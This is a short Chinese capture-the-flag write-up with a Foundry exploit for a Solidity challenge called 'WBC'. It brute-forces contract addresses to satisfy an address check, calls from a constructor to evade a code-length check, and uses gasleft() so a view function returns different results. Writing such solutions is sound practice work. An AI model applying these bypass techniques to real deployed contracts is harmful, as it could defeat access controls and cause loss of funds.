比较难处理的函数是 `bodyCheck` 和 `_homeBase` 两个函数。其中 `bodyCheck` 要求调用地址满足 `% 100 == 10`，可以通过 try 多次创建合约枚举完成。`msg.sender.code.length == 0` 需要在构造函数中进行调用。`_homeBase`  要求两次对一个 `view` 调用的结果不同，可以通过两次的 `gasleft()` 不同进行区分。其他的函数按要求写就可以。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";
import {WBC, WBCBase} from "src/WBC/WBC.sol";

contract WBCTest is Test {
    WBCBase public base;
    WBC public wbc;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new WBCBase(startTime, endTime, fullScore);
        base.setup();
        wbc = base.wbc();
    }

    function testExploit() external {
        for (uint256 i = 0; i < 1000; ++i) {
            try new Ans(address(wbc)) returns (Ans ans) {
                ans.win();
                base.solve();
                assertTrue(base.isSolved());
                break;
            } catch {}
        }
    }
}


contract Ans {
    WBC public immutable wbc;
    uint256 pre_gas;
    constructor(address wbc_) {
        wbc = WBC(wbc_);
        wbc.bodyCheck();
    }

    function win() external {
        wbc.ready();
    }

    function judge() external view returns (address) {
        return block.coinbase;
    }

    function steal() external pure returns (uint160) {
        return 507778882907781185490817896798523593512684789769;
    }

    function execute() external returns (bytes32) {
        string memory ans = "HitAndRun";
        pre_gas = gasleft();
        return bytes32(uint256(uint80(bytes10(abi.encodePacked(uint8(bytes(ans).length), ans)))));
    }

    function shout() external view returns (string memory) {
        if (pre_gas - gasleft() < 26666) {
            return "I'm the best";
        } else {
            return "We are the champion!";
        }
    }
}
```

